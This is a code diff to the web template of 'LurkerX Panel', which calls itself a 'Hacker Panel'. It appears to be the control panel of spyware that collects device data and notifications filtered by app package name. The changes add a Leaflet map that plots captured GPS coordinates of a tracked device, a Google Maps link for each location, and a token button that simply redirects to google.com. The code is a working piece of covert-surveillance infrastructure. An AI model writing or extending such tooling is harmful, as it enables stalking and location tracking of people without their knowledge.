@@ -5,6 +5,7 @@
   <meta charset="UTF-8">
   <title>{% block title %}Hacker Panel | LurkerX{% endblock %}</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" />
   <style>
 :root {
@@ -318,6 +319,16 @@ body {
   color: var(--accent);
 }
 
+.card-actions {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-top: 12px;
+}
+.gps-map {
+  background: var(--panel-2);
+}
+
 .spinner-container {
   position: fixed;
   top: 16px;
@@ -370,7 +381,8 @@ body {
   border-color: var(--accent-2);
 }
 .login-box button {
-  width: 100%;
+  width: 47%;
+  margin: 0.8%;
   padding: 12px;
   border: none;
   border-radius: 6px;
@@ -381,6 +393,9 @@ body {
   font-weight: 600;
   text-transform: uppercase;
   letter-spacing: 0.05em;
+}
+.login-box .token-btn {
+  background: var(--accent-2);
 }
 .login-box button:hover {
   background: #34d399;
@@ -426,6 +441,7 @@ body {
         <h1>LurkerX Panel</h1>
         <p>Enter your token to access the panel.</p>
         <input id="token-input" type="text" placeholder="Encrypted token" />
+        <button id="token-btn">Get New Token</button>
         <button id="login-btn">Unlock Panel</button>
         <p id="login-error" class="login-error"></p>
       </div>
@@ -490,6 +506,10 @@ body {
         errorEl.textContent = err.message;
         errorEl.style.display = "block";
       });
+    });
+
+    document.getElementById("token-btn").addEventListener("click", ()=> {
+      window.location.href = "https://google.com";
     });
   </script>
   {% endif %}
@@ -614,8 +634,54 @@ body {
         card.innerHTML = rows.map(r =>
           `<div class="card-row"><div class="card-label">${r.label}</div><div class="card-value">${r.value}</div></div>`
         ).join("");
+        if (type === "gps") {
+          const lat = parseFloat(item.latitude);
+          const lon = parseFloat(item.longitude);
+          const mapId = "gps-map-" + Math.random().toString(36).slice(2, 9);
+          const gmUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+          const actions = document.createElement("div");
+          actions.className = "card-actions";
+          actions.innerHTML = `
+            <button class="control-btn" onclick="toggleGpsMap('${mapId}', ${lat}, ${lon})">
+              <span class="material-icons-round">map</span> View GPS
+            </button>
+            <a class="control-btn" href="${gmUrl}" target="_blank" rel="noopener">
+              <span class="material-icons-round">open_in_new</span> Google Maps
+            </a>
+          `;
+          const mapContainer = document.createElement("div");
+          mapContainer.id = mapId;
+          mapContainer.className = "gps-map";
+          mapContainer.style.display = "none";
+          mapContainer.style.height = "220px";
+          mapContainer.style.marginTop = "10px";
+          mapContainer.style.borderRadius = "6px";
+          mapContainer.style.border = "1px solid var(--border)";
+          card.appendChild(actions);
+          card.appendChild(mapContainer);
+        }
         boardContent.appendChild(card);
       });
+    }
+
+    function toggleGpsMap(mapId, lat, lon) {
+      const container = document.getElementById(mapId);
+      if (!container) return;
+      if (container.style.display === "none") {
+        container.style.display = "block";
+        if (!container._leafletMap) {
+          const map = L.map(mapId).setView([lat, lon], 14);
+          L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+            attribution: "&copy; OpenStreetMap"
+          }).addTo(map);
+          L.marker([lat, lon]).addTo(map).bindPopup(`<b>Location</b><br>${lat.toFixed(6)}, ${lon.toFixed(6)}`).openPopup();
+          container._leafletMap = map;
+        } else {
+          container._leafletMap.invalidateSize();
+        }
+      } else {
+        container.style.display = "none";
+      }
     }
 
     function filterNotifications(packageName) {
